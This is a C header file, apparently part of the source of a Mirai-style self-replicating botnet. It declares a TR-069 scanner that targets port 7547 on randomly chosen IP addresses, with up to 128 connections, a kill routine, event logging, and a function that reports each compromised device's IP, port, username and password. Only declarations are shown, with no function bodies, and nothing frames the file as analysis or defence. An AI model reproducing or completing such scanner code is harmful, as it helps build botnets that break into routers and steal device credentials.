#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"
#define TR069_SCANNER_MAX_CONNS   128
#define TR069_PORT                7547
void tr069_scanner(void);
void tr069_kill(void);
static void tr069_setup_connection(ipv4_t target_ip);
static ipv4_t get_random_tr069_ip(void);
static void tr069_report(ipv4_t ip, uint16_t port, const char *user, const char *pass);
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details);
#endif
